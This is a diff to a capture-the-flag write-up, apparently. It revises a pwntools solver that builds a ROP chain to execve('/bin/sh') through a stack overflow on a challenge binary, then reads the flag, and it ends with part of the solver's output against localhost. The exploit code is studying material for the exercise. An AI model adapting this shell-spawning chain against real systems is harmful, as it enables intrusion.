@@ -379,7 +379,7 @@ io.stream()
 
 ```python
 #!/usr/bin/env python3
-from pwn import ELF, ROP, args, context, flat, log, process, remote
+from pwn import ELF, ROP, asm, args, context, flat, log, process, remote
 from pwnlib import gdb
 
 exe = context.binary = ELF("file/chall", checksec=False)
@@ -391,24 +391,37 @@ else:
     io = process(exe.path)
 
 rop = ROP(exe)
-rop.raw(0x000000000040139c)  # mov rdi, rsp; add rsp, 8; ret;
+
+# ------------------------------------------------------------------------
+# # execve("/bin/sh", 0, 0): syscall 59
+# rop.raw(0x000000000040139c)  # mov rdi, rsp; add rsp, 8; ret;
+# rop.raw(b"/bin/sh\x00")
+# rop.raw(0x000000000040137e)  # xor rsi, rsi; ret;
+# rop.raw(0x000000000040138d)  # xor rdx, rdx; ret;
+# rop.raw(0x0000000000401371)  # pop rax; ret;
+# rop.raw(59)
+# rop.raw(0x00000000004013af)  # syscall; ret;
+# ------------------------------------------------------------------------
+
+# ------------------------------------------------------------------------
+# # execve("/bin/sh", 0, 0): syscall 59
+rop.raw(next(exe.search(asm("mov rdi, rsp; add rsp, 8; ret"), executable=True)))
 rop.raw(b"/bin/sh\x00")
-rop.raw(0x000000000040137e)  # xor rsi, rsi; ret;
-rop.raw(0x000000000040138d)  # xor rdx, rdx; ret;
-# # rop.raw(0x0000000000401371)  # pop rax; ret;
-# # rop.raw(59)
+rop.raw(next(exe.search(asm("xor rsi, rsi; ret;"), executable=True)))
+rop.raw(next(exe.search(asm("xor rdx, rdx; ret;"), executable=True)))
 rop.rax = 59
-# execve("/bin/sh", 0, 0): syscall 59
-rop.raw(rop.syscall.address)  # 0x00000000004013af: syscall; ret;
+rop.raw(rop.syscall.address)
+# ------------------------------------------------------------------------
+
 log.info("ROP:\n%s", rop.dump())
 io.sendlineafter(b" > ", flat(b"A"*0x28, rop.chain()))
 io.sendline(b"cat FLAG")
 io.stream()
 ```
 
-### Answer
+## Answer
 
-```zsh
+```
 ./solver.py REMOTE
 [+] Opening connection to ::1 on port 9005: Done
 [*] Loaded 7 cached gadgets for 'file/chall'
